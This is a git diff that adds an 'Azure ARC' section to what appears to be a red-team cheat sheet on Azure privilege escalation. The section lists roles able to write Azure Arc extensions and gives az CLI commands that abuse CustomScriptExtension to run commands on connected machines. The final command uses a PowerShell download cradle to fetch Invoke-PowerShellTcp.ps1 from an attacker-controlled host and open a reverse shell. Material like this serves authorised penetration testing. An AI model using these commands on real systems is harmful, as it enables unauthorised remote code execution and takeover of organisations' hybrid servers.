@@ -22,6 +22,7 @@
 * [Function apps continuous deployment](#Function-apps-continuous-deployment)
 * [Break glass accounts](#Break-glass-accounts)
 * [Azure Container Registry dump](#Azure-Container-Registry-dump)
+* [Azure ARC}(#Azure ARC)
 
 ## Privesc enumeration
 ### When on a new machine
@@ -561,4 +562,26 @@ Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
 ```
 Get-AzPasswords
 Get-AzACR
+```
+
+## Azure ARC
+- https://github.com/0xJs/RedTeaming_CheatSheet/edit/main/cloud/azure/privilege-escalation.md
+- All roles with “Microsoft.HybridCompute/machines/extensions/write” permission are able to install or update an Azure Arc Extension. Some of them are:
+  - Owner
+  - Contributor
+  - Azure Connected Machine Resource Administrator
+  - Hybrid Server Resource Administrator
+  - Windows Admin Center Administrator Login
+
+#### Check azure arc
+- Login to azure Portal and check for connected machines in Azure Arc
+
+#### Retrieve the local IP address of the server:
+```
+az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name ipconfig --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'ipconfig'}" --location "eastus"
+```
+
+#### Retrieve interactive shell on the machine
+```
+az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name RemoteCode --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'powershell -c iex(New-Object Net.Webclient).downloadstring(\'http://<IP>/Invoke-PowerShellTcp.ps1\')'}" --location "eastus"
 ```
